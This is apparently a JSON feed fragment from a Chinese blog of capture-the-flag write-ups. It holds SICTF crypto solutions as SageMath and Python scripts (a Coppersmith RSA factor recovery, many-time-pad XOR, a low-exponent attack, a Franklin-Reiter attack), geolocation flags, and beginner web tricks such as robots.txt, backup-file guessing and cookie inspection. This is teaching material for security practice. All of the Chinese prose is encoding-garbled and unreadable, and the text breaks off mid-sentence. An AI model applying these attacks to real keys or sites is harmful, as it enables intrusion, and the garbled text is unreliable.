class=\"language-PHP\">üê©üëÉüê™üêºüëÖüêØüê©üëàüëáüë≠üëüüëùüê∫üê≠üëâüëôüë§üëãüëöüê™üê´üëçüë¢üëÆüë±üêºüë¢üë®üë†üë≠üêΩüê∞üêªüëöüëÇüëßüë†üë•üëõüëÆüëØüëÆüë¨üêæüëêüëõüëåüëöüëûüê®üëèüëâüëÜüêøüëÜüëòüëáüê∫üë¶üê∏üëÉüê≠üëüüëëüë™üëÉüëÅüêªüêªüëúüêßüëáüëäüêßüêæüêºüëáüê´üê∫üëêüëÜüë™üêºüëãüëåüëßüêªüëêüê©üê∫üë•üêΩüëãüëâüê∞üëéüë†üë†üë£üêßüê´üëßüê≠üë¢üêØüëëüëëüêÆüëÇüëèüêªüë•üëöüêÆüëãüë¨üëåüë•üëÅüë£üëÖüëßüëØüë¶üëåüëåüëçüë†üëåüêΩüëâüëÉüëäüê´üëâüê®üêÆüë©üëÜüê™üêØüëòüëèüëèüêºüë©üëçüëäüëçüë°üëÄüë∞üëãüë£üë®üëßüëçüëúüëêüëõüêÆüëòüëÖüë†üêøüëÇüë∞üëÑüëàüëùüë†üë§üëÉüëõüëòüê≠üëÖüë±üëÜüë¨üë´üë•üëÜüêΩüëÅüëêüë•üëäüëáüëâüëäüë©üëåüë≠üê´üê´üë¨üë±üêØüëáüê∫üëÅüëûüëëüëôüêÆüëúüëãüëòüë™üë©üëöüë¶üë®üëÄüë©üëêüëâüëÉüêæüë•üëÄüê´üëùüëçüê©üêßüë∞üëÜüëáüë®üê™üëÉüê≠üë¶üê´üë±\n</code></pre>\n<p>emjio Ëß£ÂØÜ</p>\n<pre><code class=\"language-PHP\">2L3EN82QPvhfC6RbmTc34VkwzEkqivF9DcKpindwxwuGYdUcg1XROHOaPCoAL6hZsLJDDe0PS0GEP4CYOsETUpDY2CnFTR9Wiil04p6k8ZZ7KXDnc7TuUnJlNpxoUUViUFRLS4R17rO38aXXErVSVjIyTlqpVeYd7aNiHKyMQfimLda6NzOutnOFJYnSPRSrUv44uz8PCJgZb7eTasrcoqIrYRLGnI4fV20yOPq3L6o4z\n</code></pre>\n<p><img data-src=\"/img/sictfpic/16.png\" alt=\"img\"></p>\n<h3 id=\"radio\"><a class=\"markdownIt-Anchor\" href=\"#radio\">#</a> Radio</h3>\n<p><img data-src=\"/img/sictfpic/17.png\" alt=\"img\"></p>\n<h3 id=\"easy_coppersmith\"><a class=\"markdownIt-Anchor\" href=\"#easy_coppersmith\">#</a> Easy_CopperSmith</h3>\n<pre><code class=\"language-Java\">from sage.all import *\nimport binascii\nfrom Crypto.Util.number import *\n\nn =114007680041157617250208809154392208683967639953423906669116998085115503737001019559692895227927818755160444076128820965038044269092587109196557720941716578025622244634385547194563001079609897387390680250570961313174656874665690193604984942452581886657386063927035039087208310041149977622001887997061312418381\ncipher =87627846271126693177889082381507430884663777705438987267317070845965070209704910716182088690758208915234427170455157948022843849997441546596567189456637997191173043345521331111329110083529853409188141263211030032553825858341099759209550785745319223409181813931086979471131074015406202979668575990074985441810\n\ne2 = 0x10001\npbits = 512\nfor i in range(0,2**4):\n    p4=0x38481379948fa6f1dcedd12e2fb045f096e9978eccc3be2984a9ede4e6ebe1958606c590\n    p4=p4+int(hex(i),16)\n    print(hex(p4))\n    kbits = pbits - p4.nbits()  #Êú™Áü•ÈúÄË¶ÅÁàÜÁ†¥ÁöÑÊØîÁâπ‰ΩçÊï∞\n    print(p4.nbits())\n    p4 = p4 &lt;&lt; kbits\n    PR.&lt;x&gt; = PolynomialRing(Zmod(n))\n    f = x + p4\n    roots = f.small_roots(X=2^kbits, beta=0.4) #ËøõË°åÁàÜÁ†¥\n    #print roots\n    if roots:        #ÁàÜÁ†¥ÊàêÂäüÔºåÊ±ÇÊ†π\n        p = p4+int(roots[0])\n        print(&quot;p: &quot;, hex(int(p)))\n        assert n % p == 0\n        q = n/int(p)\n        print(&quot;q: &quot;, hex(int(q)))\n        print(gcd(p,q))\n        phin = (p-1)*(q-1)\n        print(gcd(e2,phin))\n        d = inverse_mod(e2,phin)\n        print(&quot;dÔºö&quot;,d)\n        flag = pow(cipher,d,n)\n        flag = hex(int(flag))[2:]\n        result = &quot;&quot;\n        for i in range(0, len(flag), 2):\n            hex_int = int(flag[i:i+2], 16)  # ËΩ¨Êç¢‰∏∫Êï¥Êï∞\n            result += chr(hex_int)  # ËΩ¨Êç¢‰∏∫Â≠óÁ¨¶Âπ∂ÊãºÊé•Âà∞ÁªìÊûúÂ≠óÁ¨¶‰∏≤\n        print('result :',result)\n        \n# SICTF 3f9366ed-b8e4-412f-bbd0-62616a24115c&#125;\n</code></pre>\n<h3 id=\"mingtianpao\"><a class=\"markdownIt-Anchor\" href=\"#mingtianpao\">#</a> MingTianPao</h3>\n<pre><code class=\"language-Python\">import codecs\nimport numpy as np\n\ndef is_character(x):\n    return ord('a') &lt;= x &lt;= ord('z') or ord('A') &lt;= x &lt;= ord('Z')\n\ndef xor_strings(s1, s2):\n    return bytes([b1 ^ b2 for b1, b2 in zip(s1, s2)])\n\ndef infer_space(index, pos):\n    if message[index, pos] != 0:\n        return\n    message[index, pos] = ord(' ')\n    for x in range(len(ciphertexts)):\n        if x != index:\n            message[x][pos] = xor_strings(ciphertexts[x], ciphertexts[index])[pos] ^ ord(' ')\n\ndef find_spaces():\n    for index, x in enumerate(ciphertexts):\n        res = [xor_strings(x, y) for y in ciphertexts if x != y]\n        f = lambda position: len(list(filter(is_character, [s[position] for s in res])))\n        cnt = [f(pos) for pos in range(len(x))]\n        for pos in range(len(x)):\n            space_data.append((f(pos), index, pos))\n\nwith open('222.txt', 'r') as file:\n    ciphertexts = [codecs.decode(x.strip().encode(), 'hex') for x in file.readlines()]\n\nmessage = np.zeros([len(ciphertexts), len(ciphertexts[0])], dtype=int)\n\nspace_data = []\n\nfind_spaces()\n\nspace_data = sorted(space_data, reverse=True)\nfor weight, index, pos in space_data:\n    infer_space(index, pos)\n\nprint('\\n'.join([''.join([chr(c) for c in x]) for x in message]))\n</code></pre>\n<p>ÂæóÂá∫ÁöÑÁªìÊûúÔºåÁåúÊµãÁ¨¨‰∏ÄË°åÊï∞ÊçÆÔºåÂºÇÊàñÂ∞±ÂèØ‰ª• Little Red Riding Hood promised Little Red,Rdin+ Hood ppomi4e d to obey de mo8her. Thg gr&amp;n dmother liz ou8 in the&quot;woo#s , a half hcu fr#m the vklla e . When Litxl     Re (Riding&quot;Hoo# entered thi od? a wolf&quot;cam&quot; up to her.,Se d% d not klow 0h nim-l he waq, a) d id #f him.  Goo# day to you   itt e Red Rkdin</p>\n<pre><code class=\"language-Python\">hex_str1 = &quot;1f2037202a1e6d06353b61263d050a0538493b3018544e14171d2b1c4218&quot;\nhex_str2 = &quot;Little Red Riding Hood promised&quot;\n\nbytes1 = bytes.fromhex(hex_str1)\nbytes2 = bytes(hex_str2, 'utf-8')\n\nresult = bytes([a ^ b for a, b in zip(bytes1, bytes2)])\n\nresult_str = result.decode('utf-8')\nprint(result_str)\n</code></pre>\n<h3 id=\"small_e\"><a class=\"markdownIt-Anchor\" href=\"#small_e\">#</a> small_e</h3>\n<p>‰ΩéÊåáÊï∞Âä†ÂØÜ /m È´ò‰ΩçÊîªÂáª</p>\n<p><img data-src=\"/img/sictfpic/18.png\" alt=\"img\"></p>\n<pre><code class=\"language-Python\">def phase2(high_m, n, c,e):\n    R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation='NTL')\n    m = high_m + x\n    M = m((m^e - c).small_roots()[0])\n    hex_str = hex(int(M))[2:]\n    print(hex_str)\n    return hex_str\n\nn = 23407088262641313744603678186127228163189328033499381357614318160776774708961658114505773173784501557046914457908828086210961235530240151825359345210845219656000760996670856300710703016947799649686427460688236465568188205550456293373157997725204643414082796492333552579250010906010553831060540937802882205118399938918764313169385349293602085310111289583058965780887097301702677087443291977479125263301000328313103296364864396361278863921717374909215078711198899810620522933994481419395021233240234478331179727351050575360886334237633420906629984625441302945112631166021776379103081857393866576659121443879590011160797\nc = 1584727211980974717747362694412040878682966138197627512650829607105625096823456063149392973232737929737200028676411430124019573130595696272668927725536797627059576270068695792221537212669276826952363636924278717182163166234322320044764324434683614360641636360301452618063418349310497430566465329766916213742181\nhigh_m = 11658736990073967239197168945911788935424691658202162501032766529463315401599017877851823976178979438592\ne = 3\n\nhex_str = phase2(high_m, n, c,e)\n# Â∞Ü16ËøõÂà∂Â≠óÁ¨¶‰∏≤ËΩ¨Êç¢‰∏∫Êï¥Êï∞\nint_value = Integer('0x' + hex_str)\n\n# Â∞ÜÊï¥Êï∞ÊãÜÂàÜ‰∏∫Â§ö‰∏™Â≠óËäÇÔºåÂπ∂ËΩ¨Êç¢‰∏∫ÂØπÂ∫îÁöÑASCIIÂ≠óÁ¨¶\nstr_value = ''.join(chr(int(hex_str[i:i+2], 16)) for i in range(0, len(hex_str), 2))\n\nprint(str_value)\n\n</code></pre>\n<h3 id=\"Á≠æÂà∞È¢òÊù•ÂíØ\"><a class=\"markdownIt-Anchor\" href=\"#Á≠æÂà∞È¢òÊù•ÂíØ\">#</a> Á≠æÂà∞È¢òÊù•ÂíØÔºÅ</h3>\n<pre><code class=\"language-Python\">import libnum\nimport binascii\nfrom  Crypto.Util.number import *\nn = 18993579800590288733556762316465854395650778003397512624355925069287661487515652428099677335464809283955351330659278915073219733930542167360381688856732762552737791137784222098296804826261681852699742456526979985201331982720936091963830799430264680941164508709453794113576607749669278887105809727027129736803614327631979056934906547015919204770702496676692691248702461766117271815398943842909579917102217310779431999448597899109808086655029624478062317317442297276087073653945439820988375066353157221370129064423613949039895822016206336117081475698987326594199181180346821431242733826487765566154350269651592993856883\nc1 = 3089900890429368903963127778258893993015616003863275300568951378177309984878857933740319974151823410060583527905656182419531008417050246901514691111335764182779077027419410717272164998075313101695833565450587029584857433998627248705518025411896438130004108810308599666206694770859843696952378804678690327442746359836105117371144846629293505396610982407985241783168161504309420302314102538231774470927864959064261347913286659384383565379900391857812482728653358741387072374314243068833590379370244368317200796927931678203916569721211768082289529948017340699194622234734381555103898784827642197721866114583358940604520\nc2 = 6062491672599671503583327431533992487890060173533816222838721749216161789662841049274959778509684968479022417053571624473283543736981267659104310293237792925201009775193492423025040929132360886500863823523629213703533794348606076463773478200331006341206053010168741302440409050344170767489936681627020501853981450212305108039373119567034948781143698613084550376070802084805644270376620484786155554275798939105737707005991882264123315436368611647275530607811665999620394422672764116158492214128572456571553281799359243174598812137554860109807481900330449364878168308833006964726761878461761560543284533578701661413931\ndef is_prime(n):\n    if n &lt;= 1:\n        return False\n    if n &lt;= 3:\n        return True\n    if n % 2 == 0 or n % 3 == 0:\n        return False\n    i = 5\n    while i * i &lt;= n:\n        if n % i == 0 or n % (i + 2) == 0:\n            return False\n        i += 6\n    return True    \ndef franklinReiter(n,e,c1,c2):\n    PR.&lt;x&gt; = PolynomialRing(Zmod(n))\n    g1 = (114*x+2333)^int(e) - c1\n    g2 = (514*x+4555)^int(e) - c2\n    def gcd(g1, g2):\n        while g2:\n            g1, g2 = g2, g1 % g2\n        return g1.monic()\n    return -gcd(g1, g2)[0]\n\nfor i in range(1024):\n    if is_prime(i):\n        e = i\n        m=franklinReiter(n,e,c1,c2)\n        print(long_to_bytes((int(m))))\n</code></pre>\n<h1 id=\"forensics\"><a class=\"markdownIt-Anchor\" href=\"#forensics\">#</a> Forensics</h1>\n<h3 id=\"Ë¥≠Áâ©‰πãÊóÖ\"><a class=\"markdownIt-Anchor\" href=\"#Ë¥≠Áâ©‰πãÊóÖ\">#</a> Ë¥≠Áâ©‰πãÊóÖ</h3>\n<p>SICTF Âåó‰∫¨Â∏Ç_È°∫‰πâÂå∫_Êñ∞È°∫ÂçóÂ§ßË°ó_Âåó‰∫¨ÂçéËÅîÈ°∫‰πâÈáëË°óË¥≠Áâ©‰∏≠ÂøÉ}</p>\n<h3 id=\"ÁæéÂ•≥ÂßêÂßê\"><a class=\"markdownIt-Anchor\" href=\"#ÁæéÂ•≥ÂßêÂßê\">#</a> ÁæéÂ•≥ÂßêÂßê</h3>\n<p>SICTF Á¶èÂª∫ÁúÅÁ¶èÂ∑ûÂ∏Ç‰ªìÂ±±Âå∫ÁÉüÂè∞Â±±ÂÖ¨Âõ≠}</p>\n<h3 id=\"ÂÆùÂ°îÈïáÊ≤≥Â¶ñ\"><a class=\"markdownIt-Anchor\" href=\"#ÂÆùÂ°îÈïáÊ≤≥Â¶ñ\">#</a> ÂÆùÂ°îÈïáÊ≤≥Â¶ñ</h3>\n<p>SICTF Â±±‰∏úÁúÅÊµéÂÆÅÂ∏ÇÊ±∂‰∏äÂéøÂ§™Â≠êÁÅµË∏™Â°î}</p>\n",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "http://example.com/2023/08/24/web-new/",
            "url": "http://example.com/2023/08/24/web-new/",
            "title": "web_new",
            "date_published": "2023-08-24T15:55:12.000Z",
            "content_html": "<h1 id=\"webÊñ∞Êâã\"><a class=\"markdownIt-Anchor\" href=\"#webÊñ∞Êâã\">#</a> web Êñ∞ÊâãÔºö</h1>\n<p>ÊîªÈò≤‰∏ñÁïå WEB Âå∫Â§çÁé∞Ôºö</p>\n<h2 id=\"robots\"><a class=\"markdownIt-Anchor\" href=\"#robots\">#</a> robots:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824195924438.png\" alt=\"image-20230824195924438\"></p>\n<blockquote>\n<p>robots.txt Êñá‰ª∂ÊòØ‰∏Ä‰∏™ÊñáÊú¨Êñá‰ª∂Ôºå‰ΩøÁî®‰ªª‰Ωï‰∏Ä‰∏™Â∏∏ËßÅÁöÑÊñáÊú¨ÁºñËæëÂô®ÔºåÊØîÂ¶Ç Windows Á≥ªÁªüÂÆâË£Ö‰∫Ü NotepadÔºåÂ∞±ÂèØ‰ª•ÂàõÂª∫ÂíåÁºñËæëÂÆÉ</p>\n<p>robots.txt ÊòØ‰∏Ä‰∏™ÂçèËÆÆÔºåËÄå‰∏çÊòØ‰∏Ä‰∏™ÂëΩ‰ª§„ÄÇrobots.txt ÊòØÊêúÁ¥¢ÂºïÊìé‰∏≠ËÆøÈóÆÁΩëÁ´ôÁöÑÊó∂ÂÄôË¶ÅÊü•ÁúãÁöÑÁ¨¨‰∏Ä‰∏™Êñá‰ª∂„ÄÇrobots.txt Êñá‰ª∂ÂëäËØâËúòËõõÁ®ãÂ∫èÂú®ÊúçÂä°Âô®‰∏ä‰ªÄ‰πàÊñá‰ª∂ÊòØÂèØ‰ª•Ë¢´Êü•ÁúãÁöÑ„ÄÇ</p>\n<p>ÂΩì‰∏Ä‰∏™ÊêúÁ¥¢ËúòËõõËÆøÈóÆ‰∏Ä‰∏™Á´ôÁÇπÊó∂ÔºåÂÆÉ‰ºöÈ¶ñÂÖàÊ£ÄÊü•ËØ•Á´ôÁÇπÊ†πÁõÆÂΩï‰∏ãÊòØÂê¶Â≠òÂú® robots.txtÔºåÂ¶ÇÊûúÂ≠òÂú®ÔºåÊêúÁ¥¢Êú∫Âô®‰∫∫Â∞±‰ºöÊåâÁÖßËØ•Êñá‰ª∂‰∏≠ÁöÑÂÜÖÂÆπÊù•Á°ÆÂÆöËÆøÈóÆÁöÑËåÉÂõ¥ÔºõÂ¶ÇÊûúËØ•Êñá‰ª∂‰∏çÂ≠òÂú®ÔºåÊâÄÊúâÁöÑÊêúÁ¥¢ËúòËõõÂ∞ÜËÉΩÂ§üËÆøÈóÆÁΩëÁ´ô‰∏äÊâÄÊúâÊ≤°ÊúâË¢´Âè£‰ª§‰øùÊä§ÁöÑÈ°µÈù¢„ÄÇÁôæÂ∫¶ÂÆòÊñπÂª∫ËÆÆÔºå‰ªÖÂΩìÊÇ®ÁöÑÁΩëÁ´ôÂåÖÂê´‰∏çÂ∏åÊúõË¢´ÊêúÁ¥¢ÂºïÊìéÊî∂ÂΩïÁöÑÂÜÖÂÆπÊó∂ÔºåÊâçÈúÄË¶Å‰ΩøÁî® robots.txt Êñá‰ª∂„ÄÇÂ¶ÇÊûúÊÇ®Â∏åÊúõÊêúÁ¥¢ÂºïÊìéÊî∂ÂΩïÁΩëÁ´ô‰∏äÊâÄÊúâÂÜÖÂÆπÔºåËØ∑ÂãøÂª∫Á´ã robots.txt Êñá‰ª∂„ÄÇ</p>\n<p>Â¶ÇÊûúÂ∞ÜÁΩëÁ´ôËßÜ‰∏∫ÈÖíÂ∫óÈáåÁöÑ‰∏Ä‰∏™ÊàøÈó¥Ôºårobots.txt Â∞±ÊòØ‰∏ª‰∫∫Âú®ÊàøÈó¥Èó®Âè£ÊÇ¨ÊåÇÁöÑ ‚ÄúËØ∑ÂãøÊâìÊâ∞‚Äù Êàñ ‚ÄúÊ¨¢ËøéÊâìÊâ´‚Äù ÁöÑÊèêÁ§∫Áâå„ÄÇËøô‰∏™Êñá‰ª∂ÂëäËØâÊù•ËÆøÁöÑÊêúÁ¥¢ÂºïÊìéÂì™‰∫õÊàøÈó¥ÂèØ‰ª•ËøõÂÖ•ÂíåÂèÇËßÇÔºåÂì™‰∫õÊàøÈó¥Âõ†‰∏∫Â≠òÊîæË¥µÈáçÁâ©ÂìÅÔºåÊàñÂèØËÉΩÊ∂âÂèä‰ΩèÊà∑ÂèäËÆøÂÆ¢ÁöÑÈöêÁßÅËÄå‰∏çÂØπÊêúÁ¥¢ÂºïÊìéÂºÄÊîæ„ÄÇ‰ΩÜ robots.txt ‰∏çÊòØÂëΩ‰ª§Ôºå‰πü‰∏çÊòØÈò≤ÁÅ´Â¢ôÔºåÂ¶ÇÂêåÂÆàÈó®‰∫∫Êó†Ê≥ïÈòªÊ≠¢Á™ÉË¥ºÁ≠âÊÅ∂ÊÑèÈóØÂÖ•ËÄÖ„ÄÇ</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824200258007.png\" alt=\"image-20230824200258007\"></p>\n<blockquote>\n<p>ÊãôËßÅÔºöDisallow Â∞±ÊòØÁ¶ÅÊ≠¢ÁöÑÊÑèÊÄù</p>\n<p>‚Äã\t\t   Allow Â∞±ÊòØÂÖÅËÆ∏ÁöÑÊÑèÊÄù</p>\n</blockquote>\n<p>ÂõûÂΩíËØ•È¢òÔºö</p>\n<p><img data-src=\"/img/webpic/image-20230824200522350.png\" alt=\"image-20230824200522350\"></p>\n<p>ÂΩìÊàë‰ª¨ÂéªËÆøÈóÆ robots.txt ÁöÑÊó∂ÂÄôÔºåÂèëÁé∞ÊâÄÊúâÁöÑÊêúÁ¥¢ÂºïÊìé‰∏çÂÖÅËÆ∏ÂéªËÆøÈóÆ  f1ag_1s_h3re.php Êñá‰ª∂ÔºåËØ¥ÊòéËøôÊòØÊïèÊÑü‰ø°ÊÅØ„ÄÇÊ†πÊçÆÊèêÁ§∫ÔºåÊàë‰ª¨ÂéªËÆøÈóÆËøô‰∏™Êñá‰ª∂„ÄÇ</p>\n<p><img data-src=\"/img/webpic/image-20230824201130674.png\" alt=\"image-20230824201130674\"></p>\n<p>ÊàêÂäüËé∑Âèñ flag„ÄÇ</p>\n<h2 id=\"backup\"><a class=\"markdownIt-Anchor\" href=\"#backup\">#</a> backup:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824201515063.png\" alt=\"image-20230824201515063\"></p>\n<blockquote>\n<p>ÊèêÁ§∫ÊòØÂéªÂØªÊâæÂ§á‰ªΩÊñá‰ª∂</p>\n</blockquote>\n<p>ÊâìÂºÄÁïåÈù¢Ôºö</p>\n<p><img data-src=\"/img/webpic/image-20230824201448729.png\" alt=\"\"></p>\n<blockquote>\n<p>ÂæàÂÆπÊòìÊÉ≥Âà∞ÔºåËøôÈáåË¶ÅÊâæ index.php ÁöÑÂ§á‰ªΩÊñá‰ª∂„ÄÇ</p>\n<p>web ÁΩëÈ°µÂ∏∏ËßÅÁöÑÂ§á‰ªΩÊñá‰ª∂ÂêéÁºÄÂêçÔºö‚Äú.git‚Äù,‚Äú.svn‚Äù,‚Äú.swp‚Äù,‚Äú.~‚Äù,‚Äú.bak‚Äù,‚Äú.bash_history‚Äù,‚Äú.bkf‚Äù</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824201722649.png\" alt=\"image-20230824201722649\"></p>\n<p><img data-src=\"/img/webpic/image-20230824201755816.png\" alt=\"image-20230824201755816\"></p>\n<p>Ëé∑Âèñ flag„ÄÇ</p>\n<h2 id=\"cookie\"><a class=\"markdownIt-Anchor\" href=\"#cookie\">#</a> cookie:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824201926829.png\" alt=\"image-20230824201926829\"></p>\n<p>Ê†πÊçÆÊèêÁ§∫Ôºåcookie ÈáåÈù¢Êúâ‰∏úË•ø„ÄÇ</p>\n<p><img data-src=\"/img/webpic/image-20230824202025146.png\" alt=\"image-20230824202025146\"></p>\n<blockquote>\n<p>Cookie ÊòØ‰∏ÄÁßçÂ≠òÂÇ®Âú®ËÆ°ÁÆóÊú∫ÊµèËßàÂô®ÁõÆÂΩï‰∏≠ÁöÑÊñáÊú¨Êñá‰ª∂„ÄÇÂΩìÁî®Êà∑ÊµèËßàÊüê‰∏™Á´ôÁÇπÂπ∂Ê≥®ÂÜåÂ∏êÂè∑ÔºåÂ∞±‰ºöÁîüÊàê‰∏Ä‰∏™ Cookie Êñá‰ª∂Áî®‰∫éËÆ∞ÂΩïÁôªÂΩï‰ø°ÊÅØ„ÄÇÁõÆÂâçÔºåÂ§ßÂ§öÊï∞ÁΩëÁ´ôÈÉΩ‰ºöÂ∫îÁî® Cookie ÊäÄÊúØÔºåËøôÊó¢ËÉΩÁªôÁî®Êà∑Êèê‰æõ‰∏Ä‰∏™Â•ΩÁöÑÁΩëÁªúÁéØÂ¢ÉÔºåÂèàËÉΩÊñπ‰æøÊî∂ÈõÜËÆøÂÆ¢‰ø°ÊÅØ„ÄÇ</p>\n<h2 id=\"cookieÊúâÂì™‰∫õÁâπÊÄß\"><a class=\"markdownIt-Anchor\" href=\"#cookieÊúâÂì™‰∫õÁâπÊÄß\">#</a> Cookie ÊúâÂì™‰∫õÁâπÊÄß:</h2>\n<p>È¶ñÂÖàÔºåÊòØ Cookie ÁöÑÂÆûÊïàÊÄß„ÄÇÁõÆÂâçÊúâ‰∫õ Cookie ÊòØ‰∏¥Êó∂ÁöÑÔºåÊúâ‰∫õÂàôÊòØÊåÅÁª≠ÁöÑ„ÄÇ‰∏¥Êó∂ÁöÑ Cookie Âè™Âú®ÊµèËßàÂô®‰∏ä‰øùÂ≠ò‰∏ÄÊÆµËßÑÂÆöÁöÑÊó∂Èó¥Ôºå‰∏ÄÊó¶Ë∂ÖËøáËßÑÂÆöÁöÑÊó∂Èó¥ÔºåËØ• Cookie Â∞±‰ºöË¢´Á≥ªÁªüÊ∏ÖÈô§„ÄÇ</p>\n<p>ÂÖ∂Ê¨°ÔºåÊòØ Cookie ÁöÑÈôêÂà∂ÊÄß„ÄÇCookie ÂøÖÈ°ªÂú® HTML Êñá‰ª∂ÁöÑÂÜÖÂÆπËæìÂá∫‰πãÂâçËÆæÁΩÆÔºõ‰∏çÂêåÁöÑÊµèËßàÂô® (Netscape Navigator„ÄÅInternet Explorer) ÂØπ Cookie ÁöÑÂ§ÑÁêÜ‰∏ç‰∏ÄËá¥Ôºå‰ΩøÁî®Êó∂‰∏ÄÂÆöË¶ÅËÄÉËôëÔºõÂÆ¢Êà∑Á´ØÁî®Êà∑Â¶ÇÊûúËÆæÁΩÆÁ¶ÅÊ≠¢ CookieÔºåÂàô Cookie ‰∏çËÉΩÂª∫Á´ã„ÄÇ Âπ∂‰∏îÂú®ÂÆ¢Êà∑Á´ØÔºå‰∏Ä‰∏™ÊµèËßàÂô®ËÉΩÂàõÂª∫ÁöÑ Cookie Êï∞ÈáèÊúÄÂ§ö‰∏∫ 300 ‰∏™ÔºåÂπ∂‰∏îÊØè‰∏™‰∏çËÉΩË∂ÖËøá 4KBÔºåÊØè‰∏™ Web Á´ôÁÇπËÉΩËÆæÁΩÆÁöÑ Cookie ÊÄªÊï∞‰∏çËÉΩË∂ÖËøá 20 ‰∏™„ÄÇ</p>\n<h2 id=\"cookieÊúâ‰ªÄ‰πà‰ΩúÁî®\"><a class=\"markdownIt-Anchor\" href=\"#cookieÊúâ‰ªÄ‰πà‰ΩúÁî®\">#</a> Cookie Êúâ‰ªÄ‰πà‰ΩúÁî®:</h2>\n<p>Cookie ÂØπ‰∫éÁΩëÁ´ôÂºÄÂèëËÄÖËÄåË®ÄÔºå‰ªéÊüê‰∏™ËßíÂ∫¶ÁêÜËß£Êõ¥ÂÉèÊµèËßàÂô®ÁöÑ ‚ÄúÁºìÂ≠ò‚Äù ÂÆÉÊ∏ÖÊô∞ÁöÑËÆ∞ÂΩï‰Ω†ÁöÑË°å‰∏∫ÊåáÊ†áÔºåÊúâÂà©‰∫éÔºö</p>\n<p>Ôºà1ÔºâËé∑ÂèñÁ≤æÂáÜÁöÑËÆøÂÆ¢ÁîªÂÉèÔºöÁî®Êà∑‰ΩçÁΩÆ„ÄÅËÆøÈóÆÂñúÂ•Ω„ÄÅÂπ¥ÈæÑÁªìÊûÑ„ÄÅÁâπÂÆöË¥¶Âè∑‰ø°ÊÅØÁ≠â„ÄÇ</p>\n<p>Ôºà2ÔºâÂπøÂëäËÅîÁõüÔºöÊèê‰æõÊõ¥Âä†Á≤æÂáÜÁöÑÁõ∏ÂÖ≥‰∫ßÂìÅ‰ø°ÊÅØÔºåËøô‰πüÊòØ‰∏∫‰ªÄ‰πàÔºåÂΩì‰Ω†ÊêúÁ¥¢Êüê‰∏™‰∫ßÂìÅ‰ª•ÂêéÔºåÂú®ÂêÑÂ§ßÁîµÂïÜÁΩëÁ´ôÊàñÂ∏¶ÊúâÂπøÂëäËÅîÁõü‰ª£Á†ÅÁöÑÁ´ôÁÇπÔºåÁªèÂ∏∏Âá∫Áé∞ÂêåÁ±ª‰∫ßÂìÅÁöÑÂéüÂõ†„ÄÇ</p>\n<p>Ôºà3ÔºâÊé®ËøõÊõ¥Â§ö‰∏™ÊÄßÂåñÁöÑÂÜÖÂÆπ‰ø°ÊÅØÔºåÂª∂ËøüÈ°µÈù¢ÂÅúÁïôÊó∂Èó¥ÔºåÊèêÈ´òËΩ¨ÂåñÁéá„ÄÇ</p>\n</blockquote>\n<p>ËøôÈáåÊàë‰ª¨ÈááÁî® burp Êäì‰∏Ä‰∏ãÂåÖÔºö</p>\n<p><img data-src=\"/img/webpic/image-20230824202352929.png\" alt=\"image-20230824202352929\"></p>\n<p>ÂèëÁé∞Êúâ‰∏Ä‰∏™ cookie.php, Â∞ùËØï‰∏Ä‰∏ãÔºö</p>\n<p><img data-src=\"/img/webpic/image-20230824202455049.png\" alt=\"image-20230824202455049\"></p>\n<p>ÂΩìÊàë‰ª¨‰º†Âà∞ url ‰∏äÁöÑÊó∂ÂÄôÔºåÊèêÁ§∫Êàë‰ª¨ËØ∑Áúã http responseÔºåÊâÄ‰ª• cookie Â∫îËØ•ÊòØÂú®ÂìçÂ∫îÂåÖÁöÑ‰∏Ä‰∏™‰∏úË•ø„ÄÇ</p>\n<p><img data-src=\"/img/webpic/image-20230824202815382.png\" alt=\"image-20230824202815382\"></p>\n<p>ÊàêÂäüËé∑Âèñ flag„ÄÇ</p>\n<h2 id=\"disabled_button\"><a class=\"markdownIt-Anchor\" href=\"#disabled_button\">#</a> disabled_button:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824203157237.png\" alt=\"image-20230824203157237\"></p>\n<p>ÂΩìÊàë‰ª¨ÊâìÂºÄÁΩëÈ°µÔºö</p>\n<p><img data-src=\"/img/webpic/image-20230824203237567.png\" alt=\"image-20230824203237567\"></p>\n<p>ÂèëÁé∞Ê≠§ÊåâÈíÆ‰∏çËÉΩÊåâ‰∏ãÂéª„ÄÇ</p>\n<p><img data-src=\"/img/webpic/image-20230824203315948.png\" alt=\"image-20230824203315948\"></p>\n<p>f12 Êü•ÁúãÊ∫êÁ†ÅÔºåÂèëÁé∞ËæìÂÖ•Êúâ‰∏äÈù¢ÁöÑÂ≠óÊÆµÔºö</p>\n<blockquote>\n<p>ÂΩì input ÁöÑÂ±ûÊÄßËÆæÁΩÆ‰∏∫ disabled=‚Äúdisabled‚ÄúÊó∂ÔºåË°®Âçï‰∏ç‰ºöÊèê‰∫§Ê≠§ input ÁöÑÊï∞ÊçÆ</p>\n</blockquote>\n<blockquote>\n<p>disabledÔºöÂØπ‰∫éÂÖ®ÈÉ®ÁöÑË°®ÂçïÂÖÉÁ¥†ÈÉΩÊúâÊïàÔºåÂåÖÊã¨ select, radio, checkbox, button Á≠â„ÄÇËã•ÊòØ‰∏Ä‰∏™ËæìÂÖ•È°πÁöÑ disabled ËÆæ‰∏∫ trueÔºåÂàôËØ•Ë°®ÂçïËæìÂÖ•È°π‰∏çËÉΩËé∑ÂèñÁÑ¶ÁÇπÔºåÁî®Êà∑ÁöÑÂÖ®ÈÉ®ÊìçÂÅöÔºàÈº†Ê†áÁÇπÂáªÂíåÈîÆÁõòËæìÂÖ•Á≠âÔºâÂØπËØ•ËæìÂÖ•È°πÈÉΩÊó†ÊïàÔºåÊúÄÈáçË¶ÅÁöÑ‰∏ÄÁÇπÊòØÂΩìÊèê‰∫§Ë°®ÂçïÊó∂ÔºåËøô‰∏™Ë°®ÂçïËæìÂÖ•È°πÂ∞Ü‰∏ç‰ºöË¢´Êèê‰∫§„ÄÇ</p>\n<p>readonlyÔºöÂè™ÈíàÂØπ input (text /password) Âíå textarea ÊúâÊïàÔºõËã•ÊòØËÆæ‰∏∫ 